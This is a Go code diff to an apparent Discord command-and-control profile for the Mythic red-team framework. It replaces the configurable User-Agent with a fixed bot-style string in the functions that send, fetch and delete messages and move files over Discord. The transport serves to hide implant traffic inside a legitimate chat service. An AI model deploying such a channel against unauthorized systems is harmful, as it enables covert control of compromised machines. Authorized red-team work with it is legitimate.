@@ -30,6 +30,9 @@ const (
 	maxMessageLength  = 1950 // Discord limit ~2000; server uses 1950 threshold
 	defaultPollChecks = 10   // Default number of polling attempts per message exchange
 	defaultPollDelay  = 10   // Default seconds between polling attempts
+	// Discord blocks browser-like User-Agents (e.g. "Mozilla/5.0") when used with
+	// Bot token auth, returning 403/40333. Use a bot-style UA for API calls.
+	discordBotUA = "DiscordBot (https://github.com, 1.0)"
 )
 
 // MythicMessageWrapper is the envelope used to transport Mythic messages through
@@ -681,9 +684,7 @@ func (d *DiscordProfile) sendTextMessage(content string, cfg *sensitiveConfig) e
 	}
 	req.Header.Set("Authorization", "Bot "+cfg.BotToken)
 	req.Header.Set("Content-Type", "application/json")
-	if d.UserAgent != "" {
-		req.Header.Set("User-Agent", d.UserAgent)
-	}
+	req.Header.Set("User-Agent", discordBotUA)
 
 	resp, err := d.doWithRateLimit(req)
 	if err != nil {
@@ -727,9 +728,7 @@ func (d *DiscordProfile) sendFileMessage(content []byte, filename string, cfg *s
 	}
 	req.Header.Set("Authorization", "Bot "+cfg.BotToken)
 	req.Header.Set("Content-Type", writer.FormDataContentType())
-	if d.UserAgent != "" {
-		req.Header.Set("User-Agent", d.UserAgent)
-	}
+	req.Header.Set("User-Agent", discordBotUA)
 
 	resp, err := d.doWithRateLimit(req)
 	if err != nil {
@@ -754,9 +753,7 @@ func (d *DiscordProfile) getMessages(cfg *sensitiveConfig, limit int) ([]discord
 		return nil, err
 	}
 	req.Header.Set("Authorization", "Bot "+cfg.BotToken)
-	if d.UserAgent != "" {
-		req.Header.Set("User-Agent", d.UserAgent)
-	}
+	req.Header.Set("User-Agent", discordBotUA)
 
 	resp, err := d.doWithRateLimit(req)
 	if err != nil {
@@ -792,9 +789,7 @@ func (d *DiscordProfile) deleteMessage(messageID string, cfg *sensitiveConfig) {
 		return
 	}
 	req.Header.Set("Authorization", "Bot "+cfg.BotToken)
-	if d.UserAgent != "" {
-		req.Header.Set("User-Agent", d.UserAgent)
-	}
+	req.Header.Set("User-Agent", discordBotUA)
 
 	resp, err := d.doWithRateLimit(req)
 	if err != nil {
@@ -811,9 +806,7 @@ func (d *DiscordProfile) downloadAttachment(attachmentURL string, cfg *sensitive
 		return nil, err
 	}
 	// Attachment URLs are CDN URLs that don't need bot auth
-	if d.UserAgent != "" {
-		req.Header.Set("User-Agent", d.UserAgent)
-	}
+	req.Header.Set("User-Agent", discordBotUA)
 
 	resp, err := d.client.Do(req)
 	if err != nil {
